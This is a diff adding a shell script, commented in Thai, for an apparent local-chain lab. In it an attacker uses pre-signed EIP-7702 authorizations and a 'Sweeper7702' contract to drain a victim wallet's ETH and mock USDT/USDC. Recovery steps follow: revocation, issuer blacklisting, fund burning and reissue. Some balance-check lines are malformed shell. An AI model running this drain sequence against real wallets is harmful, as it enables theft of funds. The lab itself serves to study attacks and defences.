@@ -1,0 +1,103 @@
+ export PATH="$HOME/.foundry/bin:$PATH"
+ anvil --hardfork prague 
+
+
+ cast wallet new
+
+
+#Setup variable
+export RPC=http://127.0.0.1:8545
+export HOT=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266   ATK=0x70997970C51812dc3A010C7d01b50e0d17dc79C8   ISS=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+export HOT_PK=
+export ATK_PK=
+export ISS_PK=
+
+
+# Deploy USDT
+export USDT=$(forge create src/lab/MockUSDT.sol:MockUSDT \
+  --rpc-url $RPC --private-key $ISS_PK --broadcast --json | jq -r .deployedTo)
+"USDT=$USDT"
+
+# Deploy USDC
+export USDC=$(forge create src/lab/MockUSDC.sol:MockUSDC \
+  --rpc-url $RPC --private-key $ISS_PK --broadcast --json \
+  --constructor-args $ISS | jq -r .deployedTo)
+"USDC=$USDC"
+
+# Deploy SWEEP
+export SWEEP=$(forge create src/lab/Sweeper7702.sol:Sweeper7702 \
+  --rpc-url $RPC --private-key $ATK_PK --broadcast --json \
+  --constructor-args $ATK $ATK | jq -r .deployedTo)
+echo "SWEEP=$SWEEP"
+
+
+# ดันให้ nonce เหยื่ออยู่ที่ 2 (ส่ง tx เปล่า 2 ครั้ง) — จำลองว่า hot wallet ขยับไปแล้ว (เผา nonce ก็ใช้วิธํีนี้)
+cast send $HOT --value 0 --private-key $HOT_PK --rpc-url $RPC
+cast send $HOT --value 0 --private-key $HOT_PK --rpc-url $RPC
+
+cast nonce $HOT --rpc-url $RPC 
+
+
+# A: เซ็น 7702 authorization ให้ชี้ไป Sweeper — ได้ลายเซ็นกลับมา type 4
+# SIG=$(curl -s "http://127.0.0.1:9099/sign-auth?target=$SWEEP&nonce=0")   
+# เซ็น 5 ใบ ไล่ nonce 0..4 (เก็บไว้ ยังไม่ส่ง)
+SIG0=$(cast wallet sign-auth $SWEEP --private-key $HOT_PK --rpc-url $RPC --nonce 2)
+SIG1=$(cast wallet sign-auth $SWEEP --private-key $HOT_PK --rpc-url $RPC --nonce 3)
+SIG2=$(cast wallet sign-auth $SWEEP --private-key $HOT_PK --rpc-url $RPC --nonce 4)
+SIG3=$(cast wallet sign-auth $SWEEP --private-key $HOT_PK --rpc-url $RPC --nonce 5)
+SIG4=$(cast wallet sign-auth $SWEEP --private-key $HOT_PK --rpc-url $RPC --nonce 6)
+echo "SIG0=$SIG0"
+
+# B: เซ็น raw tx โอน 10000 ETH ออก (แบบ Binance 16) — ได้ hex กลับมา ยังไม่ส่ง type 2
+RAW=$(cast mktx $ATK --value 10000ether --private-key $HOT_PK --rpc-url $RPC --nonce 0)
+echo $RAW
+
+
+# A: delegate (--auth is type 4 of EIP-7702) ส่ง --auth หลายครั้งได้ใน tx เดียว (เรียงลง ทนต่อการ revoke ต้องแก้โดยการเผา nonce ให้เลยใบที่ 5)
+cast send $HOT --auth "$SIG4" --auth "$SIG3" --auth "$SIG2" --auth "$SIG1" --auth "$SIG0" --private-key $ATK_PK --rpc-url $RPC
+       
+cast code  $HOT --rpc-url $RPC
+cast send $HOT --auth "$SIG0" --private-key $HOT_PK --rpc-url $RPC
+
+# delegate
+cast publish "$RAW" --rpc-url $RPC
+
+# โจรเรียก sweep ที่ address เหยื่อ — โค้ดของ SWEEP รันในบริบทเหยื่อ ดูด USDT + ETH ทั้งหมด "[$USDT,$USDC]"
+cast send $HOT "sweep(address[])" "[$USDT,$USDC]" --private-key $ATK_PK --rpc-url $RPC
+
+
+cast balance $HOT --rpc-url $RPC --ether   # เหยื่อหาย
+cast call $USDT "balanceOf(address)(uint256)" $HOT --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
+cast call $USDC "balanceOf(address)(uint256)" $HOT --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
+
+cast balance $ATK --rpc-url $RPC --ether   # โจรได้ 
+cast call $USDT "balanceOf(address)(uint256)" $ATK --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
+cast call $USDC "balanceOf(address)(uint256)" $ATK --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
+
+
+# revoke = delegate ไปที่ address ศูนย์ (0x0000...0000) ไม่มีคำสั่งชื่อ revoke โดยเฉพาะ มันคือ sign-auth + cast send --auth ชุดเดิม แค่เปลี่ยนเป้าหมายจาก $SWEEP เป็น 0x0
+# 1. เหยื่อเซ็น authorization ชี้ไป 0x0 (nonce = nonce ปัจจุบันของเหยื่อ)
+SIG0=$(cast wallet sign-auth 0x0000000000000000000000000000000000000000 --private-key $HOT_PK --rpc-url $RPC --nonce 8) #ต้อง + 1 เพราะตอนส่ง SIG ขึ้นเชนจะเกิดธุรกรรมด้วย
+
+# 2. ส่ง tx type-4 (จะเป็นใครส่งก็ได้ ในสคริปต์ให้ ATK ส่ง)
+cast send $HOT --auth "$SIG0" --private-key $HOT_PK --rpc-url $RPC
+
+
+
+# freeze address
+export DROP=$ATK
+
+cast send $USDT "addBlackList(address)" $DROP --private-key $ISS_PK --rpc-url $RPC
+cast send $USDC "blacklist(address)"    $DROP --private-key $ISS_PK --rpc-url $RPC
+
+# USDT เผาเงินในกระเป๋าโจรทิ้งได้เลย
+cast send $USDT "destroyBlackFunds(address)" $DROP --private-key $ISS_PK --rpc-url $RPC
+
+# USDT mint คืนได้ด้วยหลังจากเผาทิ้ง
+cast send $USDT "issue(uint256)" 1175000000000000 --private-key $ISS_PK --rpc-url $RPC
+cast send $USDT "transfer(address,uint256)" $VICTIM 1175000000000000 --private-key $ISS_PK --rpc-url $RPC
+
+
+# หลังแก้ contract แล้ว คนอัปเกรดโค้ด ≠ คนกด freeze
+# เรียกโดย proxy admin เท่านั้น
+cast send $USDC "upgradeTo(address)" $NEW_LOGIC --private-key $ADMIN_PK --rpc-url $RPC
